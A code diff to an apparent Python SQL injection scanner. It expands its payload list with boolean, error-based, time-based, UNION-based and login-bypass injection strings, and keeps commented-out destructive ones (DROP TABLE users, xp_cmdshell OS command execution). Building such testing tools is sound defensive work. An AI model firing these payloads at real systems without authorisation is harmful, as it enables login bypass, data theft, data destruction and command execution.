@@ -6,11 +6,40 @@ class SQLInjectionScanner:
     """Class to scan for SQL Injection vulnerabilities in web forms."""
 
     PAYLOADS = [
-        "' OR '1'='1",
-        "' OR '1'='1' --",
-        "' OR 'a'='a",
-        "' UNION SELECT NULL, version() --",
-        "' UNION SELECT NULL, user() --"
+        # Boolean-based
+    "' OR '1'='1",
+    "' OR 1=1 --",
+    "' OR 'a'='a",
+    "' OR 1=1#",
+    
+    # Error-based
+    "' AND 1=CONVERT(int, (SELECT @@version)) --",
+    "' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(CHAR(58,97,58), (SELECT database()), CHAR(58,98,58), FLOOR(RAND()*2)) AS x FROM information_schema.tables GROUP BY x) a) --",
+
+    # Time-based blind
+    "' OR SLEEP(5) --",
+    "'; WAITFOR DELAY '00:00:05' --",
+    "' AND IF(1=1, SLEEP(5), 0) --",
+    "' AND 1=IF(1=1, SLEEP(5), 0) --",
+    "'||(SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE NULL END)--",
+
+    # UNION-based
+    "' UNION SELECT NULL, NULL --",
+    "' UNION SELECT NULL, version() --",
+    "' UNION SELECT 1, user() --",
+    "' UNION SELECT 1, database() --",
+    
+    # Stacked queries (only works if the DB allows multiple queries) to dangerous to use, effects can be destructive. 
+    #"'; DROP TABLE users; --", deletes user table
+    #"'; SELECT pg_sleep(5); --", Postgres sleep, blind test
+    #"'; EXEC xp_cmdshell('whoami'); --", OS command execution (MSSQL) | High | Dangerous – system command
+
+    # Generic payloads
+    "\" OR \"\" = \"",
+    "') OR ('1'='1",
+    "admin' --",
+    "admin') --",
+    "' OR '' = '"
     ]
 
     SEVERITY = {
@@ -49,7 +78,7 @@ class SQLInjectionScanner:
             print(f"🛠️  Testing payload: {payload}")
 
             try:
-                response = requests.post(target_url, data=test_data, timeout=5)
+                response = requests.post(target_url, data=test_data, timeout=10)
 
                 if response.status_code == 200 and ("Welcome" in response.text or "Dashboard" in response.text):
                     print(f"  ⚠️ Possible SQL Injection Detected at {target_url}!")
